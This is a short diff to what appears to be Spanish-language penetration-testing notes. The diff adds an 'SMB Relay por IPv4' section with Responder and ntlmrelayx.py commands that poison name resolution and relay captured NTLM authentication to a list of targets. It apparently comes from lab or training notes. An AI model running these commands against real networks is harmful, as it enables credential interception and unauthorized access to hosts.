@@ -32,3 +32,10 @@ HTTP y SMB deben estar en Off en la configuración del Responder
 sudo nano /usr/share/responder/Responder.conf
 ```
 <img src="https://i.imgur.com/XypgqGB.png" />
+
+# Efectuar un SMB Relay por IPv4
+
+```
+python /usr/share/responder.py -I tun0 -rdw
+ntlmrelayx.py -tf <targets.txt> -smb2support
+```
